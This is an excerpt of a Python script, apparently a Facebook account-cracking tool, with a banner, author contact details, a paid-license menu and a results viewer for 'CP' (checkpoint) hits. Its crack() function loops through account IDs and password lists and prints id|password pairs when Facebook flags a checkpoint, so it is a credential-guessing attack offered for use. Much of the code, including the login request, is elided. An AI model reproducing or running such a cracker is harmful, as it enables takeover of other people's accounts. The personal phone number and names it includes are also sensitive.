...
"""%(N))                                                    
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Nama       : ARIYAN
 [\x1b[1;96m+%s] WhatsApp   : 01706200853
 [\x1b[1;96m+%s] Facebook   : Muhammad Sajjad Lashari
 [\x1b[1;96m+%s] Github      : https://github.com/ariyanamhed404/Pram-x
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
def kontol():
    os.system("clear")
    print(f"""    _____    _____    _____ __     __) _____    __     __) 
  (, /  |  (, /   ) (, /  (, )   /   (, /  |  (, /|  /    
    /---|    /__ /    /     /   /      /---|    / | /     
 ) /    |_) /   \____/__   (___/_   ) /    |_) /  |/      
(_/      (_/    (__ /     )   /    (_/      (_/   '       
...
{B} |
{P}[•] AUTHOR: Ariyan404
{P}[•] WHATSAPP: +01706200853
{B}[•] FACEBOOK: Muhammad Sajjad Lashari""")
def licensi():#line:42
  try :#line:43
    os .system ('clear')
    kontol()
...
""")#line:49
    ...
    if OOO00O0OOO00OO00O in ['1','01']:#line:51
      print (f"{H}[{P}!{H}]{P} ARIYAN SHUVO Diarahkan Ke Whatsapp...");time .sleep (3 );os .system ('xdg-open https://www.facebook.com/profile.php?id=100006205997419?text=Bang+Kalz+Beli+Lisensi');exit ()#line:52
...
def menu():
	...
	sol().print(fx)
	#print(x+'['+h+'•'+x+'] \033[0;34mNama Ariyan shuvo  : '+str(my_name))
	#print(x+'['+h+'•'+x+'] \033[0;34mID Ariyan Shuvo    : '+str(my_id))
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			haha = '# ARIYAN BELUM MEMILIKI RESULT CP'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# ARIYAN CP ARIYAN'
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [Ariyan-XD] %s/%s •_• [OK] %s •_• [CP] %s •_• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	...
	for kes in akun:
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				...
				print('\r%s++++ %s|%s ----> ARIYAN      %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
